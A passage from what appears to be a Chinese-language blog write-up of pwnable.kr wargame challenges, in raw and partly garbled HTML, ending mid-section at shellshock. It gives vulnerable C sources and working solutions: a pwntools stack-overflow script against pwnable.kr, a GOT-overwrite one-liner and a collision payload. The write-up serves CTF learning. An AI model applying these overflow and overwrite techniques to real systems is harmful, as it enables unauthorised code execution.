0x6C5CEC8</code></p>\n<p><strong>payload</strong></p>\n<p>./col  <code>python -c 'print &quot;\\xC9\\xCE\\xC5\\x06\\xC9\\xCE\\xC5\\x06\\xC9\\xCE\\xC5\\x06\\xC9\\xCE\\xC5\\x06\\xC8\\xCE\\xC5\\x06&quot;'</code></p>\n<h2 id=\"bof\"><a class=\"anchor\" href=\"#bof\">#</a> bof</h2>\n<h3 id=\"题目描述-3\"><a class=\"anchor\" href=\"#题目描述-3\">#</a> 题目描述</h3>\n<p>#include &lt;stdio.h&gt;<br />\n#include &lt;string.h&gt;<br />\n#include &lt;stdlib.h&gt;<br />\nvoid func(int key){<br />\nchar overflowme[32];<br />\nprintf(&quot;overflow me:&quot;);<br />\ngets(overflowme);\t// smash me!<br />\nif(key == 0xcafebabe){<br />\nsystem(&quot;/bin/sh&quot;);<br />\n}<br />\nelse{<br />\nprintf(&quot;Nah..\\n&quot;);<br />\n}<br />\n}<br />\nint main(int argc, char* argv[]){<br />\nfunc(0xdeadbeef);<br />\nreturn 0;<br />\n}</p>\n<h3 id=\"题目解析-3\"><a class=\"anchor\" href=\"#题目解析-3\">#</a> 题目解析</h3>\n<p>很明显的栈溢出，将 key 的值覆盖为 <code>0xCAFEBABE</code>  就可以了</p>\n<p><strong>payload</strong></p>\n<p>from pwn import *<br />\ncontext.log_level='debug'</p>\n<p>p=remote(&quot;<span class=\"exturl\" data-url=\"aHR0cDovL3B3bmFibGUua3I=\">pwnable.kr</span>&quot;,9000)<br />\n#print p.recvline()<br />\npayload='a'*52<br />\npayload+=p64(0xCAFEBABE)<br />\np.sendline(payload)</p>\n<p>p.interactive()</p>\n<h2 id=\"flag\"><a class=\"anchor\" href=\"#flag\">#</a> flag</h2>\n<h3 id=\"题目描述-4\"><a class=\"anchor\" href=\"#题目描述-4\">#</a> 题目描述</h3>\n<p>虽然在 pwnable 上面，但是是一道逆向题</p>\n<p>Papa brought me a packed present! let's open it.</p>\n<p>Download:<span class=\"exturl\" data-url=\"aHR0cDovL3B3bmFibGUua3IvYmluL2ZsYWc=\">http://pwnable.kr/bin/flag</span></p>\n<p>This is reversing task. all you need is binary</p>\n<h3 id=\"题目解析-4\"><a class=\"anchor\" href=\"#题目解析-4\">#</a> 题目解析</h3>\n<p>刚拿到就直接放进了 ida 中，结果只显示 4 个函数，并且有的还无法 F5。后来看了 wp 才知道程序被 upx 压缩过了</p>\n<p><code>upx -d flag</code>  解压缩，ida 分析程序</p>\n<p>int __cdecl main(int argc, const char **argv, const char **envp)<br />\n{<br />\nchar *dest; // ST08_8</p>\n<p>puts((__int64)&quot;I will malloc() and strcpy the flag there. take it.&quot;);<br />\ndest = (char *)malloc(100LL);<br />\nstrcpy(dest, flag);<br />\nreturn 0;<br />\n}</p>\n<p>非常简单的逻辑，把 flag 复制到 dest 中，查看 flag 处的数据即可</p>\n<h2 id=\"passcode\"><a class=\"anchor\" href=\"#passcode\">#</a> passcode</h2>\n<h3 id=\"题目描述-5\"><a class=\"anchor\" href=\"#题目描述-5\">#</a> 题目描述</h3>\n<p>#include &lt;stdio.h&gt;<br />\n#include &lt;stdlib.h&gt;</p>\n<p>void login(){<br />\nint passcode1;<br />\nint passcode2;</p>\n<pre><code>    printf(&quot;enter passcode1:&quot;);\n    scanf(&quot;%d&quot;, passcode1);\n    fflush(stdin);\n\n    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)\n    printf(&quot;enter passcode2:&quot;);\n    scanf(&quot;%d&quot;, passcode2);\n\n    printf(&quot;checking...\\n&quot;);\n    if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123;\n            printf(&quot;Login OK!\\n&quot;);\n            system(&quot;/bin/cat flag&quot;);\n    &#125;\n    else&#123;\n            printf(&quot;Login Failed!\\n&quot;);\n            exit(0);\n    &#125;\n</code></pre>\n<p>}</p>\n<p>void welcome(){<br />\nchar name[100];<br />\nprintf(&quot;enter you name:&quot;);<br />\nscanf(&quot;%100s&quot;, name);<br />\nprintf(&quot;Welcome %s!\\n&quot;, name);<br />\n}</p>\n<p>int main(){<br />\nprintf(&quot;Toddler's Secure Login System 1.0 beta.\\n&quot;);</p>\n<pre><code>    welcome();\n    login();\n\n    // something after login...\n    printf(&quot;Now I can safely trust you that you have credential :)\\n&quot;);\n    return 0;\n</code></pre>\n<p>}</p>\n<h3 id=\"题目解析-5\"><a class=\"anchor\" href=\"#题目解析-5\">#</a> 题目解析</h3>\n<p>login 函数中的两个 scanf 的参数没有加 &amp;，但是 scanf 依然会把 passcode1 和 passcode2 当成指针来存储数据，也就是说此时输入的数据应该在 passcode1 和 passcode2 中的值所指向的地址里面。</p>\n<p>如果将 passcode1 或 passcode2 里面的值覆盖为某个函数的地址，构造好栈的布局，参数为 <code>system(&quot;/bin/cat flag&quot;)</code>  的地址，那么 scanf 就会将 <code>system(&quot;/bin/cat flag&quot;)</code>  的地址覆盖到原本的函数地址上去，然后得到 flag。</p>\n<p>接下来就需要计算 name 到 passcode 的长度</p>\n<p>gdb 反汇编分析，只看关键部分</p>\n<p>welcome:<br />\n0x0804862f &lt;+38&gt;:    lea    -0x70 (% ebp),% edx\t;name 的地址<br />\n 0x08048632 &lt;+41&gt;:    mov    % edx,0x4 (% esp)<br />\n0x08048636 &lt;+45&gt;:    mov    %eax,(%esp)<br />\n0x08048639 &lt;+48&gt;:    call   0x80484a0 <span class=\"exturl\" data-url=\"bWFpbHRvOl9faXNvYzk5X3NjYW5mQHBsdA==\">__isoc99_scanf@plt</span></p>\n<p>login:<br />\npasscode1:<br />\n0x0804857c &lt;+24&gt;:    mov    -0x10 (% ebp),% edx\t;passcode1 的地址<br />\n 0x0804857f &lt;+27&gt;:    mov    % edx,0x4 (% esp)<br />\n0x08048583 &lt;+31&gt;:    mov    %eax,(%esp)<br />\n0x08048586 &lt;+34&gt;:    call   0x80484a0 <span class=\"exturl\" data-url=\"bWFpbHRvOl9faXNvYzk5X3NjYW5mQHBsdA==\">__isoc99_scanf@plt</span><br />\npasscode2:<br />\n0x080485aa &lt;+70&gt;:    mov    -0xc (% ebp),% edx\t;passcode2 的地址<br />\n 0x080485ad &lt;+73&gt;:    mov    % edx,0x4 (% esp)<br />\n0x080485b1 &lt;+77&gt;:    mov    %eax,(%esp)<br />\n0x080485b4 &lt;+80&gt;:    call   0x80484a0 <span class=\"exturl\" data-url=\"bWFpbHRvOl9faXNvYzk5X3NjYW5mQHBsdA==\">__isoc99_scanf@plt</span><br />\nsystem_getflag:<br />\n0x080485e3 &lt;+127&gt;:   movl   $0x80487af,(%esp)<br />\n0x080485ea &lt;+134&gt;:   call   0x8048460 <span class=\"exturl\" data-url=\"bWFpbHRvOnN5c3RlbUBwbHQ=\">system@plt</span></p>\n<p>通过计算可知，name 到 passcode1 的长度为 96 字节，name 的长度为 100，刚好可以溢出覆盖 passcode1。</p>\n<p>接着查看 plt 表，因为只够覆盖到 passcode1，所以选择 fflush 函数</p>\n<p><strong>payload</strong></p>\n<p>python -c &quot;print 'A' * 96 + '\\x00\\xa0\\x04\\x08' + '134514147\\n'&quot; | ./passcode</p>\n<h2 id=\"random\"><a class=\"anchor\" href=\"#random\">#</a> random</h2>\n<h3 id=\"题目描述-6\"><a class=\"anchor\" href=\"#题目描述-6\">#</a> 题目描述</h3>\n<p>#include &lt;stdio.h&gt;</p>\n<p>int main(){<br />\nunsigned int random;<br />\nrandom = rand();\t// random value!</p>\n<pre><code>unsigned int key=0;\nscanf(&quot;%d&quot;, &amp;key);\n\nif( (key ^ random) == 0xdeadbeef )&#123;\n\tprintf(&quot;Good!\\n&quot;);\n\tsystem(&quot;/bin/cat flag&quot;);\n\treturn 0;\n&#125;\n\nprintf(&quot;Wrong, maybe you should try 2^32 cases.\\n&quot;);\nreturn 0;\n</code></pre>\n<p>}</p>\n<h3 id=\"题目解析-6\"><a class=\"anchor\" href=\"#题目解析-6\">#</a> 题目解析</h3>\n<p>观察代码，令 <code>key^random</code>  的值等于 <code>0xdeadbeef</code>  就可以得到 flag。刚开始以为是栈溢出，但是 <code>scanf(&quot;%d&quot;,&amp;key)</code>  只会读取 4 个字节，不够覆盖 random。</p>\n<p>调试了几次发现 random 每次的值都一样，那么只需要将 <code>0xdeadbeef</code>  与 random 异或就可以得到 key 的值，最后输入 key 的时候要先把 key 转为 10 进制，因为 scanf 的格式化字符串是 % d。</p>\n<p>关于为什么 random 每次的值都一样</p>\n<p>rand<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlODclQkQlRTYlOTUlQjA=\"> 函数</span>不是真正的随机数生成器，而 srand () 会设置供 rand () 使用的随机数种子。如果你在第一次调用 rand () 之前没有调用 srand ()，那么系统会为你自动调用 srand ()。如果用户在此之前没有调用过 srand (seed)，它会自动调用 srand (1) 一次。而使用同种子相同的数调用 rand () 会导致相同的<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTklOUElOEYlRTYlOUMlQkE=\">随机</span>数序列被生成。</p>\n<h2 id=\"input2\"><a class=\"anchor\" href=\"#input2\">#</a> input2</h2>\n<h3 id=\"题目描述-7\"><a class=\"anchor\" href=\"#题目描述-7\">#</a> 题目描述</h3>\n<p>#include &lt;stdio.h&gt;<br />\n#include &lt;stdlib.h&gt;<br />\n#include &lt;string.h&gt;<br />\n#include &lt;sys/socket.h&gt;<br />\n#include &lt;arpa/inet.h&gt;</p>\n<p>int main(int argc, char* argv[], char* envp[]){<br />\nprintf(&quot;Welcome to <span class=\"exturl\" data-url=\"aHR0cDovL3B3bmFibGUua3I=\">pwnable.kr</span>\\n&quot;);<br />\nprintf(&quot;Let's see if you know how to give input to program\\n&quot;);<br />\nprintf(&quot;Just give me correct inputs then you will get the flag 😃\\n&quot;);</p>\n<pre><code>// argv\nif(argc != 100) return 0;\nif(strcmp(argv['A'],&quot;\\x00&quot;)) return 0;\nif(strcmp(argv['B'],&quot;\\x20\\x0a\\x0d&quot;)) return 0;\nprintf(&quot;Stage 1 clear!\\n&quot;);\t\n\n// stdio\nchar buf[4];\nread(0, buf, 4);\nif(memcmp(buf, &quot;\\x00\\x0a\\x00\\xff&quot;, 4)) return 0;\nread(2, buf, 4);\n    if(memcmp(buf, &quot;\\x00\\x0a\\x02\\xff&quot;, 4)) return 0;\nprintf(&quot;Stage 2 clear!\\n&quot;);\n\n// env\nif(strcmp(&quot;\\xca\\xfe\\xba\\xbe&quot;, getenv(&quot;\\xde\\xad\\xbe\\xef&quot;))) return 0;\nprintf(&quot;Stage 3 clear!\\n&quot;);\n\n// file\nFILE* fp = fopen(&quot;\\x0a&quot;, &quot;r&quot;);\nif(!fp) return 0;\nif( fread(buf, 4, 1, fp)!=1 ) return 0;\nif( memcmp(buf, &quot;\\x00\\x00\\x00\\x00&quot;, 4) ) return 0;\nfclose(fp);\nprintf(&quot;Stage 4 clear!\\n&quot;);\t\n\n// network\nint sd, cd;\nstruct sockaddr_in saddr, caddr;\nsd = socket(AF_INET, SOCK_STREAM, 0);\nif(sd == -1)&#123;\n\tprintf(&quot;socket error, tell admin\\n&quot;);\n\treturn 0;\n&#125;\nsaddr.sin_family = AF_INET;\nsaddr.sin_addr.s_addr = INADDR_ANY;\nsaddr.sin_port = htons( atoi(argv['C']) );\nif(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123;\n\tprintf(&quot;bind error, use another port\\n&quot;);\n\t\treturn 1;\n&#125;\nlisten(sd, 1);\nint c = sizeof(struct sockaddr_in);\ncd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c);\nif(cd &lt; 0)&#123;\n\tprintf(&quot;accept error, tell admin\\n&quot;);\n\treturn 0;\n&#125;\nif( recv(cd, buf, 4, 0) != 4 ) return 0;\nif(memcmp(buf, &quot;\\xde\\xad\\xbe\\xef&quot;, 4)) return 0;\nprintf(&quot;Stage 5 clear!\\n&quot;);\n\n// here's your flag\nsystem(&quot;/bin/cat flag&quot;);\t\nreturn 0;\n</code></pre>\n<p>}</p>\n<p>题目总共有五关，需要依次通过，pwntools 完美解决。</p>\n<h3 id=\"题目解析-7\"><a class=\"anchor\" href=\"#题目解析-7\">#</a> 题目解析</h3>\n<h4 id=\"stage-1-argv\"><a class=\"anchor\" href=\"#stage-1-argv\">#</a> stage 1 argv</h4>\n<p>if(argc != 100) return 0;<br />\nif(strcmp(argv['A'],&quot;\\x00&quot;)) return 0;<br />\nif(strcmp(argv['B'],&quot;\\x20\\x0a\\x0d&quot;)) return 0;<br />\nprintf(&quot;Stage 1 clear!\\n&quot;);</p>\n<p>第一关要求给出 100 个参数，并且第’A'（65）个和第 'B'（66）个分别是 <code>\\x00</code>  和 <code>\\x20\\x0a\\x0d</code> 。</p>\n<p>构造 list，一般情况，argv [0] 是 <code>&quot;./input&quot;</code> ，也就是程序名</p>\n<p>argv = list('1' * 100)<br />\nargv[0] = &quot;./input&quot;<br />\nargv[ord('A')] = &quot;\\x00&quot;<br />\nargv[ord('B')] = &quot;\\x20\\x0a\\x0d&quot;</p>\n<h4 id=\"stage-2-stdio\"><a class=\"anchor\" href=\"#stage-2-stdio\">#</a> stage 2 stdio</h4>\n<p>char buf[4];<br />\nread(0, buf, 4);<br />\nif(memcmp(buf, &quot;\\x00\\x0a\\x00\\xff&quot;, 4)) return 0;<br />\nread(2, buf, 4);<br />\nif(memcmp(buf, &quot;\\x00\\x0a\\x02\\xff&quot;, 4)) return 0;<br />\nprintf(&quot;Stage 2 clear!\\n&quot;);</p>\n<p>第一个 <code>memcmp</code>  从 stdin 中读取数据，与 <code>\\x00\\x0a\\x00\\xff</code>  进行对比，第二个 <code>memcmp</code>  从 stderr 中读取数据进行对比。</p>\n<p>pwntools 中的 process 有 2 个参数，stdin 和 stderr，传入文件对象即可。</p>\n<p>with open(&quot;stdin.txt&quot;, &quot;wb&quot;) as file:<br />\nfile.write(&quot;\\x00\\x0a\\x00\\xff&quot;)<br />\nfile.close()<br />\nwith open(&quot;stderr.txt&quot;, &quot;wb&quot;) as file:<br />\nfile.write(&quot;\\x00\\x0a\\x02\\xff&quot;)<br />\nfile.close()</p>\n<h4 id=\"stage-3-env\"><a class=\"anchor\" href=\"#stage-3-env\">#</a> stage 3 env</h4>\n<p>if(strcmp(&quot;\\xca\\xfe\\xba\\xbe&quot;, getenv(&quot;\\xde\\xad\\xbe\\xef&quot;))) return 0;<br />\nprintf(&quot;Stage 3 clear!\\n&quot;);</p>\n<p>依旧使用 process 中的 env 参数，env 是字典形式。</p>\n<p \\xde\\xad\\xbe\\xef:\\xca\\xfe\\xba\\xbe=\"\">env =</p>\n<h4 id=\"stage-4-file\"><a class=\"anchor\" href=\"#stage-4-file\">#</a> stage 4 file</h4>\n<p>FILE* fp = fopen(&quot;\\x0a&quot;, &quot;r&quot;);<br />\nif(!fp) return 0;<br />\nif( fread(buf, 4, 1, fp)!=1 ) return 0;<br />\nif( memcmp(buf, &quot;\\x00\\x00\\x00\\x00&quot;, 4) ) return 0;<br />\nfclose(fp);<br />\nprintf(&quot;Stage 4 clear!\\n&quot;);</p>\n<p>这一关很简单，创建个名字为 <code>\\x0a</code>  的文件，内容为 <code>\\x00\\x00\\x00\\x00</code></p>\n<p>with open(&quot;\\x0a&quot;, &quot;wb&quot;) as file:<br />\nfile.write(&quot;\\x00\\x00\\x00\\x00&quot;)<br />\nfile.close()</p>\n<h4 id=\"stage-5-network\"><a class=\"anchor\" href=\"#stage-5-network\">#</a> stage 5 network</h4>\n<p>int sd, cd;<br />\nstruct sockaddr_in saddr, caddr;<br />\nsd = socket(AF_INET, SOCK_STREAM, 0);<br />\nif(sd == -1){<br />\nprintf(&quot;socket error, tell admin\\n&quot;);<br />\nreturn 0;<br />\n}<br />\nsaddr.sin_family = AF_INET;<br />\nsaddr.sin_addr.s_addr = INADDR_ANY;<br />\nsaddr.sin_port = htons( atoi(argv['C']) );<br />\nif(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0){<br />\nprintf(&quot;bind error, use another port\\n&quot;);<br />\nreturn 1;<br />\n}<br />\nlisten(sd, 1);<br />\nint c = sizeof(struct sockaddr_in);<br />\ncd = accept(sd, (struct sockaddr <em>)&amp;caddr, (socklen_t</em>)&amp;c);<br />\nif(cd &lt; 0){<br />\nprintf(&quot;accept error, tell admin\\n&quot;);<br />\nreturn 0;<br />\n}<br />\nif( recv(cd, buf, 4, 0) != 4 ) return 0;<br />\nif(memcmp(buf, &quot;\\xde\\xad\\xbe\\xef&quot;, 4)) return 0;<br />\nprintf(&quot;Stage 5 clear!\\n&quot;);</p>\n<p>这一关是建立一个 socket 来接受数据，与 <code>\\xde\\xad\\xbe\\xef</code>  进行比较。</p>\n<p>其中需要注意这两句</p>\n<p>saddr.sin_addr.s_addr = INADDR_ANY;<br />\nsaddr.sin_port = htons( atoi(argv['C']) );</p>\n<p>第一句指定绑定的地址， <code>INADDR_ANY</code>  事实上表示不确定地址，或 “所有地址”、“任意地址”， <code>127.0.0.1</code>  当然也包含在内，第二句指定绑定端口，端口号就是 argv ['C'] 的内容，因为 argv 是我们自己设置的，所以只要设置一个不与其他程序冲突的端口号就行。</p>\n<p>直接使用 pwntools 的 remote</p>\n<p>r = remote(&quot;127.0.0.1&quot;, 9999)<br />\nr.send(&quot;\\xde\\xad\\xbe\\xef&quot;)</p>\n<p><strong>payload</strong></p>\n<p>from pwn import *</p>\n<h1 id=\"stage-1-process\"><a class=\"anchor\" href=\"#stage-1-process\">#</a> stage 1 process</h1>\n<p>argv = list('1' * 100)<br />\nargv[0] = &quot;./input&quot;<br />\nargv[ord('A')] = &quot;\\x00&quot;<br />\nargv[ord('B')] = &quot;\\x20\\x0a\\x0d&quot;</p>\n<h1 id=\"stage-2-stdio-2\"><a class=\"anchor\" href=\"#stage-2-stdio-2\">#</a> stage 2 stdio</h1>\n<p>with open(&quot;stdin.txt&quot;, &quot;wb&quot;) as file:<br />\nfile.write(&quot;\\x00\\x0a\\x00\\xff&quot;)<br />\nfile.close()<br />\nwith open(&quot;stderr.txt&quot;, &quot;wb&quot;) as file:<br />\nfile.write(&quot;\\x00\\x0a\\x02\\xff&quot;)<br />\nfile.close()</p>\n<h1 id=\"stage-3-env-2\"><a class=\"anchor\" href=\"#stage-3-env-2\">#</a> stage 3 env</h1>\n<p \\xde\\xad\\xbe\\xef:\\xca\\xfe\\xba\\xbe=\"\">env =</p>\n<h1 id=\"stage-4-file-2\"><a class=\"anchor\" href=\"#stage-4-file-2\">#</a> stage 4 file</h1>\n<p>with open(&quot;\\x0a&quot;, &quot;wb&quot;) as file:<br />\nfile.write(&quot;\\x00\\x00\\x00\\x00&quot;)<br />\nfile.close()</p>\n<h1 id=\"stage-5-network-2\"><a class=\"anchor\" href=\"#stage-5-network-2\">#</a> stage 5 network</h1>\n<p>argv[ord('C')] = &quot;9999&quot;</p>\n<p>p = process(argv=argv, env=env, stdin=open(&quot;stdin.txt&quot;,&quot;rb&quot;), stderr=open(&quot;stderr.txt&quot;,&quot;rb&quot;))<br />\nr = remote(&quot;127.0.0.1&quot;, 9999)<br />\nr.send(&quot;\\xde\\xad\\xbe\\xef&quot;)<br />\nr.close()</p>\n<p>print p.recv()<br />\nprint p.recv()</p>\n<h2 id=\"leg\"><a class=\"anchor\" href=\"#leg\">#</a> leg</h2>\n<h3 id=\"题目描述-8\"><a class=\"anchor\" href=\"#题目描述-8\">#</a> 题目描述</h3>\n<p>#include &lt;stdio.h&gt;<br />\n#include &lt;fcntl.h&gt;<br />\nint key1(){<br />\nasm(&quot;mov r3, pc\\n&quot;);<br />\n}<br />\nint key2(){<br />\nasm(<br />\n&quot;push\t{r6}\\n&quot;<br />\n&quot;add\tr6, pc, $1\\n&quot;<br />\n&quot;bx\tr6\\n&quot;<br />\n&quot;.code   16\\n&quot;<br />\n&quot;mov\tr3, pc\\n&quot;<br />\n&quot;add\tr3, $0x4\\n&quot;<br />\n&quot;push\t{r3}\\n&quot;<br />\n&quot;pop\t{pc}\\n&quot;<br />\n&quot;.code\t32\\n&quot;<br />\n&quot;pop\t{r6}\\n&quot;<br />\n);<br />\n}<br />\nint key3(){<br />\nasm(&quot;mov r3, lr\\n&quot;);<br />\n}<br />\nint main(){<br />\nint key=0;<br />\nprintf(&quot;Daddy has very strong arm!😊;<br />\nscanf(&quot;%d&quot;, &amp;key);<br />\nif( (key1()+key2()+key3()) == key ){<br />\nprintf(&quot;Congratz!\\n&quot;);<br />\nint fd = open(&quot;flag&quot;, O_RDONLY);<br />\nchar buf[100];<br />\nint r = read(fd, buf, 100);<br />\nwrite(0, buf, r);<br />\n}<br />\nelse{<br />\nprintf(&quot;I have strong leg 😛\\n&quot;);<br />\n}<br />\nreturn 0;<br />\n}</p>\n<h3 id=\"题目解析-8\"><a class=\"anchor\" href=\"#题目解析-8\">#</a> 题目解析</h3>\n<p>第 27 行中 <code>if( (key1()+key2()+key3()) == key )</code>  显示 key 的值为 <code>key1()+key2()+key3()</code>  的总和，相等即可得到 flag。</p>\n<p>源码中的看不懂，直接去看反汇编中的部分代码。</p>\n<p>(gdb) disass key1<br />\nDump of assembler code for function key1:<br />\n0x00008cd4 &lt;+0&gt;:\t\tpush\t{r11}\t\t; (str r11, [sp, #-4]!)<br />\n0x00008cd8 &lt;+4&gt;:\t\tadd\tr11, sp, #0<br />\n0x00008cdc &lt;+8&gt;:\t\tmov\tr3, pc<br />\n0x00008ce0 &lt;+12&gt;:\tmov\tr0, r3<br />\n0x00008ce4 &lt;+16&gt;:\tsub\tsp, r11, #0<br />\n0x00008ce8 &lt;+20&gt;:\tpop\t{r11}\t\t; (ldr r11, [sp], #4)<br />\n0x00008cec &lt;+24&gt;:\tbx\tlr<br />\nEnd of assembler dump.</p>\n<p>首先了解下<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZHk3MDAyL2FydGljbGUvZGV0YWlscy83Mjg1MjgyMg==\"> ARM 函数调用约定</span>，其中，结果为一个 32 位的整数时，可以通过寄存器 R0 返回，根据汇编代码可以看出，r3 寄存器中的值传给了 r0，而 pc 的值又传给了 r3。</p>\n<p>再来了解下<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMuaWNodW5xaXUuY29tL3RocmVhZC00MDQ5My0xLTEuaHRtbD9mcm9tPWJreWw=\"> pc 寄存器</span>，具体就不解释了不懂，大概就是</p>\n<p>ARM 模式下，pc = 当前指令地址 + 8；</p>\n<p>Thumb 模式下，pc = 当前指令 + 4</p>\n<p>而控制什么模式的就是一些带状态的指令，比如 bx addr，bx 就是带状态切换跳转指令，当 addr 的最后一位为 1 时，会将跳转地址处的代码解析为 Thumb 指令，最后一位为 0 的话，就解析成 ARM 指令。</p>\n<p>所以 key1=8cdc+8=8CE4‬</p>\n<p>(gdb) disass key2<br />\nDump of assembler code for function key2:<br />\n0x00008cf0 &lt;+0&gt;:\tpush\t{r11}\t\t; (str r11, [sp, #-4]!)<br />\n0x00008cf4 &lt;+4&gt;:\tadd\tr11, sp, #0<br />\n0x00008cf8 &lt;+8&gt;:\tpush\t{r6}\t\t; (str r6, [sp, #-4]!)<br />\n0x00008cfc &lt;+12&gt;:\tadd\tr6, pc, #1<br />\n0x00008d00 &lt;+16&gt;:\tbx\tr6<br />\n0x00008d04 &lt;+20&gt;:\tmov\tr3, pc<br />\n0x00008d06 &lt;+22&gt;:\tadds\tr3, #4<br />\n0x00008d08 &lt;+24&gt;:\tpush\t{r3}<br />\n0x00008d0a &lt;+26&gt;:\tpop\t{pc}<br />\n0x00008d0c &lt;+28&gt;:\tpop\t{r6}\t\t; (ldr r6, [sp], #4)<br />\n0x00008d10 &lt;+32&gt;:\tmov\tr0, r3<br />\n0x00008d14 &lt;+36&gt;:\tsub\tsp, r11, #0<br />\n0x00008d18 &lt;+40&gt;:\tpop\t{r11}\t\t; (ldr r11, [sp], #4)<br />\n0x00008d1c &lt;+44&gt;:\tbx\tlr<br />\nEnd of assembler dump.</p>\n<p>可以看到 pc 的值传给了 r3，r3 再与 4 相加，最后给 r0，这样的话 key2 的值就应该为 8D10‬，但是由于前面执行 bx r6 时 r6 最后一位为 1，所以执行后面代码时的模式是 Thumb 模式，所以 <code>mov r3, pc</code>  时 pc 的值为 8D08。</p>\n<p>key2=8d04+4+4=8D0C‬</p>\n<p>(gdb) disass key3<br />\nDump of assembler code for function key3:<br />\n0x00008d20 &lt;+0&gt;:\tpush\t{r11}\t\t; (str r11, [sp, #-4]!)<br />\n0x00008d24 &lt;+4&gt;:\tadd\tr11, sp, #0<br />\n0x00008d28 &lt;+8&gt;:\tmov\tr3, lr<br />\n0x00008d2c &lt;+12&gt;:\tmov\tr0, r3<br />\n0x00008d30 &lt;+16&gt;:\tsub\tsp, r11, #0<br />\n0x00008d34 &lt;+20&gt;:\tpop\t{r11}\t\t; (ldr r11, [sp], #4)<br />\n0x00008d38 &lt;+24&gt;:\tbx\tlr<br />\nEnd of assembler dump.</p>\n<p>lr-&gt;r3-&gt;r0，lr 是寄存器 R14: 连接寄存器，记作 lr ; 它用于保存子程序的返回地址，返回地址就是调用函数下面那一句的地址</p>\n<p>0x00008d7c &lt;+64&gt;:\tbl\t0x8d20 &lt;key3&gt;<br />\n0x00008d80 &lt;+68&gt;:\tmov\tr3, r0</p>\n<p>key3=8d80</p>\n<p><strong>key=key1+key2+key3=‭‭0x1A770‬=108400‬</strong></p>\n<h2 id=\"mistake\"><a class=\"anchor\" href=\"#mistake\">#</a> mistake</h2>\n<h3 id=\"题目描述-9\"><a class=\"anchor\" href=\"#题目描述-9\">#</a> 题目描述</h3>\n<p>hint:operator priority</p>\n<p>#include &lt;stdio.h&gt;<br />\n#include &lt;fcntl.h&gt;</p>\n<p>#define PW_LEN 10<br />\n#define XORKEY 1</p>\n<p>void xor(char* s, int len)<ruby>\n\tint i;\n\tfor(i=0; i&lt;len; i++){\n\t\ts[i] <rp>(</rp><rt> XORKEY;\n\t</rt><rp>)</rp></ruby><br />\n}</p>\n<p>int main(int argc, char* argv[]){</p>\n<pre><code>int fd;\nif(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)&#123;\n\tprintf(&quot;can't open password %d\\n&quot;, fd);\n\treturn 0;\n&#125;\n\nprintf(&quot;do not bruteforce...\\n&quot;);\nsleep(time(0)%20);\n\nchar pw_buf[PW_LEN+1];\nint len;\nif(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123;\n\tprintf(&quot;read error\\n&quot;);\n\tclose(fd);\n\treturn 0;\t\t\n&#125;\n\nchar pw_buf2[PW_LEN+1];\nprintf(&quot;input password:&quot;);\nscanf(&quot;%10s&quot;, pw_buf2);\n\n// xor your input\nxor(pw_buf2, 10);\n\nif(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123;\n\tprintf(&quot;Password OK\\n&quot;);\n\tsystem(&quot;/bin/cat flag\\n&quot;);\n&#125;\nelse&#123;\n\tprintf(&quot;Wrong Password\\n&quot;);\n&#125;\n\nclose(fd);\nreturn 0;\n</code></pre>\n<p>}</p>\n<h3 id=\"题目解析-9\"><a class=\"anchor\" href=\"#题目解析-9\">#</a> 题目解析</h3>\n<p>题目提示操作符优先级</p>\n<p>这题问题出在</p>\n<p>if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0){<br />\nprintf(&quot;can't open password %d\\n&quot;, fd);<br />\nreturn 0;<br />\n}</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo>&lt;</mo></mrow><annotation encoding=\"application/x-tex\">&lt;</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.5782em;vertical-align:-0.0391em;\"></span><span class=\"mrel\">&lt;</span></span></span></span> 优先级要比<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo>=</mo></mrow><annotation encoding=\"application/x-tex\">=</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.36687em;vertical-align:0em;\"></span><span class=\"mrel\">=</span></span></span></span> 号高，所以会先判断 <code>open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0</code> ， <code>open</code>  函数读取成功文件描述符，必定大于 0，所以 <code>open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0</code>  整个式子的值就为 false (0)，也就是 fd=0。</p>\n<p>那么下面的 <code>read(fd,pw_buf,PW_LEN)</code>  其实就是从标准输入里面读取数据。</p>\n<p>当输入 1234567890，与 1 进行异或运算后可以得到 0325476981</p>\n<h2 id=\"shellshock\"><a class=\"anchor\" href=\"#shellshock\">#</a> shellshock</h2>\n<h3 id=\"题目描述-10\"><a class=\"anchor\" href=\"#题目描述-10\">#</a> 题目描述</h3>\n<p>Mommy, there was a shocking news about bash.</p>\n<p>I bet you already know, but lets just make it sure 😃</p>\n<p>ssh <span class=\"exturl\" data-url=\"bWFpbHRvOnNoZWxsc2hvY2tAcHduYWJsZS5rcg==\">shellshock@pwnable.kr</span> -p2222 (pw:guest)</p>\n<p>#include &lt;stdio.h&gt;<br />\nint main(){<br />\nsetresuid(getegid(), getegid(), getegid());<br />\nsetresgid(getegid(), getegid(), getegid());<br />\nsystem(&quot;/home/shellshock/bash -c 'echo shock_me'&quot;);<br />\nreturn 0;<br />\n}</p>\n<h3 id=\"题目解析-10\"><a class=\"anchor\" href=\"#题目解析-10\">#</a> 